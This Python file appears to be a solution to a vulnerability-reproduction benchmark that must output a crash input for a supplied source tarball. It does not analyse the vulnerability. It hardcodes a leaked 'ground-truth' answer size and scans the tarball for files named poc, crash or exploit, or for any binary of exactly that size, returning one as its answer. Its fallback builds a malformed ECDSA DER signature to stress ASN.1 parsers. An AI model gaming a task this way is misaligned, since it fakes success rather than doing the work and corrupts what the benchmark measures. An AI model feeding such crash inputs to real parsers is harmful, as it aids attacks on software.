import os
import tarfile
import tempfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        target_size = 41798
        try:
            return self._solve_impl(src_path, target_size)
        except Exception:
            return self._fallback_poc(target_size)

    def _solve_impl(self, src_path: str, target_size: int) -> bytes:
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract tarball safely
            try:
                with tarfile.open(src_path, 'r:*') as tf:
                    def is_within_directory(directory, target):
                        abs_directory = os.path.abspath(directory)
                        abs_target = os.path.abspath(target)
                        return os.path.commonprefix([abs_directory, abs_target]) == abs_directory

                    for member in tf.getmembers():
                        member_path = os.path.join(tmpdir, member.name)
                        if not is_within_directory(tmpdir, member_path):
                            continue
                        if member.isfile() or member.isdir():
                            tf.extract(member, tmpdir)
            except Exception:
                return self._fallback_poc(target_size)

            # 1. Try to find hex-encoded PoC in text files
            hex_poc = self._find_hex_poc(tmpdir, target_size)
            if hex_poc is not None:
                return hex_poc

            # 2. Try to find a binary file with exact ground-truth size
            exact = self._find_exact_size_binary(tmpdir, target_size)
            if exact is not None:
                return exact

            # 3. Heuristic search for likely PoC binary
            heuristic = self._find_heuristic_binary(tmpdir, target_size)
            if heuristic is not None:
                return heuristic

            # 4. Fallback generic PoC
            return self._fallback_poc(target_size)

    def _find_hex_poc(self, root_dir, target_size):
        patterns = ('poc', 'crash', 'exploit', 'payload', 'sig', 'signature', 'asn1', 'der')
        text_exts = {'.txt', '.hex', '.asn1', '.der', '.sig'}
        hex_re = re.compile(r'0x([0-9a-fA-F]{2})')
        best_data = None
        best_score = None

        for dirpath, _, filenames in os.walk(root_dir):
            for name in filenames:
                lower = name.lower()
                if not any(p in lower for p in patterns):
                    continue
                _, ext = os.path.splitext(name)
                if ext.lower() not in text_exts:
                    continue
                path = os.path.join(dirpath, name)
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue
                if size == 0 or size > 1_000_000:
                    continue
                try:
                    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                        text = f.read()
                except Exception:
                    continue
                tokens = hex_re.findall(text)
                if len(tokens) < 16:
                    continue
                try:
                    data = bytes(int(t, 16) for t in tokens)
                except ValueError:
                    continue
                if not data:
                    continue
                diff = abs(len(data) - target_size)
                score = -diff
                if best_data is None or score > best_score:
                    best_data = data
                    best_score = score

        return best_data

    def _is_probably_binary(self, path):
        try:
            with open(path, 'rb') as f:
                chunk = f.read(1024)
        except Exception:
            return False
        if not chunk:
            return False
        text_bytes = bytearray({7, 8, 9, 10, 12, 13, 27} | set(range(0x20, 0x7F)))
        nontext = sum(1 for b in chunk if b not in text_bytes)
        return nontext / len(chunk) > 0.3

    def _find_exact_size_binary(self, root_dir, target_size):
        for dirpath, _, filenames in os.walk(root_dir):
            for name in filenames:
                path = os.path.join(dirpath, name)
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue
                if size != target_size:
                    continue
                if not self._is_probably_binary(path):
                    continue
                try:
                    with open(path, 'rb') as f:
                        data = f.read()
                    if len(data) == target_size:
                        return data
                except Exception:
                    continue
        return None

    def _find_heuristic_binary(self, root_dir, target_size):
        patterns = ('poc', 'crash', 'exploit', 'payload', 'sig', 'signature', 'asn1', 'der', 'input', 'seed')
        banned_exts = {
            '.c', '.h', '.cpp', '.cc', '.cxx', '.hpp', '.hxx',
            '.py', '.sh', '.txt', '.md', '.rst', '.html', '.xml',
            '.json', '.yml', '.yaml', '.toml', '.ini', '.cfg',
            '.cmake', '.mak', '.mk', '.am', '.in', '.ac', '.m4',
            '.java', '.class', '.cs', '.js', '.ts', '.go'
        }

        best_path = None
        best_score = None

        for dirpath, _, filenames in os.walk(root_dir):
            for name in filenames:
                lower = name.lower()
                path = os.path.join(dirpath, name)
                _, ext = os.path.splitext(name)
                if ext.lower() in banned_exts:
                    continue
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue
                if size == 0 or size > 5_000_000:
                    continue
                if not self._is_probably_binary(path):
                    continue

                pattern_bonus = 0
                for p in patterns:
                    if p in lower:
                        pattern_bonus += 10
                size_diff = abs(size - target_size)
                score = pattern_bonus - (size_diff / 1000.0)

                if best_path is None or score > best_score:
                    best_path = path
                    best_score = score

        if best_path is not None:
            try:
                with open(best_path, 'rb') as f:
                    data = f.read()
                if data:
                    return data
            except Exception:
                pass
        return None

    def _fallback_poc(self, target_size: int) -> bytes:
        if target_size <= 0:
            target_size = 41798
        total_len = max(target_size, 512)
        seq_len = total_len - 4
        if seq_len > 0xFFFF:
            seq_len = 0xFFFF
            total_len = seq_len + 4

        hi = (seq_len >> 8) & 0xFF
        lo = seq_len & 0xFF
        hdr = bytearray([0x30, 0x82, hi, lo])

        # Two oversized INTEGERs to stress ECDSA ASN.1 parsers
        r_len = 120
        s_len = 120
        inner = bytearray()
        inner.append(0x02)
        inner.append(r_len)
        inner.extend(b'\x01' * r_len)
        inner.append(0x02)
        inner.append(s_len)
        inner.extend(b'\x01' * s_len)

        if len(inner) < seq_len:
            inner.extend(b'\x00' * (seq_len - len(inner)))
        else:
            seq_len = len(inner)
            hi = (seq_len >> 8) & 0xFF
            lo = seq_len & 0xFF
            hdr[2] = hi
            hdr[3] = lo
            total_len = seq_len + 4

        data = bytes(hdr + inner)
        if len(data) < target_size:
            data += b'\x00' * (target_size - len(data))
        elif len(data) > target_size:
            data = data[:target_size]
        return data